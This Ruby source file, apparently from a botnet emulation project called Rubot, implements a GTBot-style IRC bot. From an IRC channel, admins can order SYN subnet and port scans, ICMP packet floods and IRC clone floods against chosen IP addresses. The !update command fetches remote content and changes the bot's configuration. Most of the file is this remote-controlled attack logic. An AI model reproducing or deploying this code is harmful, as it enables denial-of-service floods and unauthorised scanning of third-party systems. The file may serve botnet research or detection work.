require 'rubot/control/irc'
require 'rubot/attack/scanning'
require 'rubot/attack/clone_flood'
require 'rubot/attack/packeting'
require 'digest/md5'
require 'open-uri'

module Rubot
  module Model
    class GTBot
      attr_reader :server, :port, :botnick, :channel, :admins, :updater, :callbacks, :version, :info, :attacks
      
      def initialize(server='127.0.0.1', port='6667', botnick='IRCBot', channel='#test', admins=['botmaster'], updater=nil)
        @server = server
        @port = port
        @botnick = botnick
        @channel = channel
        @admins = admins
        @updater = updater
        @callbacks = Hash.new
        @version = "Rubot/#{Rubot::VERSION}"
        
				up = `uptime`.match(/up ([^,]+)/)[1]
				@info = "#{RUBY_PLATFORM}, up #{up}, Ruby #{RUBY_VERSION}, #{ENV['USER']}"
				@attacks = Array.new
        
        gtbot = self
        
        @ircbot = Rubot::Control::IRC.new do
          host gtbot.server
          port gtbot.port
          
          on(:connect) do
            nick(gtbot.botnick)
          end

          on(:nick) do
            join(gtbot.channel)
          end

          on(:join) do |channel|  # called after joining a channel
            message(gtbot.channel, "howdy all")
          end

          on(:message) do |source, target, message|  # called when being messaged
            puts "<#{source}> -> <#{target}>: #{message}" if $DEBUG
            if admins.index(source)
      				case message
      				when '!ver'
                privmsg(source, gtbot.version)
      				when '!info'
                privmsg(source, gtbot.info)
      				when /^!scan ([\d\.\*]+) (\d+)$/
      					iprange, port = [$1,$2]
                # translate iprange into subnet mask
                iprange = iprange.gsub(/\*\.\*\.\*\.\*/, "0.0.0.0/0").gsub(/\*\.\*\.\*/, "0.0.0/8").gsub(/\*\.\*/, "0.0/16").gsub(/\*/, "0/24")
                gtbot.attacks << Rubot::Attack::SubnetScan.new('syn', [port], [iprange])
                gtbot.attacks.last.launch
                privmsg(source, "scanning #{iprange}:#{port}")
      				when /^!portscan ([\d\.]+) (\d+) (\d+)$/
      					ip,sport,eport = [$1,$2.to_i,$3.to_i]
                ports = (sport..eport).to_a
      					gtbot.attacks << Rubot::Attack::HostScan.new('syn', ports, ip)
                gtbot.attacks.last.launch do |host, ports|
                  if ports
                    ports.each do |port|
                      privmsg(source, "open port found at #{host}:#{port}")
                    end
                  end
                end
                privmsg(source, "scanning #{ip}:#{sport}-#{eport}")
      				when '!stopscan'
                if gtbot.attacks.length > 0
                  gtbot.attacks.last.stop
                  gtbot.attacks.pop
                end
                privmsg(source, "stopscan")
      				when /^!packet ([\d\.]+) (\d+)$/
      					ip,count = [$1,$2]
                gtbot.attacks << Rubot::Attack::ICMPFlood.new(ip, 8, 0, 1/500.0, count.to_f/500.0)
                gtbot.attacks.last.launch
                privmsg(source, "packeting #{ip}")
      				when /^!clone ([\d\.]+) (\d+) (\d+)$/
      					ip, port, num = [$1,$2,$3]
                gtbot.attacks << Rubot::Attack::CloneFlood.new(ip, port.to_i, '#test', num.to_i, "clone_$n")
                gtbot.attacks.last.launch
                privmsg(source, "clone attacking #{ip}:#{port}")
      				when /^!update (.+)$/
      					url = $1
                puts "update url = #{url}"
      					if gtbot.updater
                  clnt = Rubot::Control::HTTP.new(url).get
                  clnt.callback do
                    data = clnt.response
                    #puts data
          					h = Digest::MD5.new
          					h.update(data)
          					config = h.hexdigest
                    #puts config
          					gtbot.updater.switch(config)
                    privmsg(source, "update complete")
                  end
                else
                  privmsg(source, "updating unsupported")
      					end
      				when /^!die/
                privmsg(source, "quitting")
      					quit
      				end
            end
          end

          # callback for all messages sent from IRC server
          on(:parsed) do |hash|
            puts "#{hash[:prefix]} #{hash[:command]} #{hash[:params].join(' ')}"
          end
        
          on(:disconnect) do
            puts "I'm disconnected"
          end
        end

      end
      
      def start
        @ircbot.connect if @ircbot
      end
      
      def stop
        @ircbot.quit if @ircbot
        @ircbot = nil
      end
    end
  end
end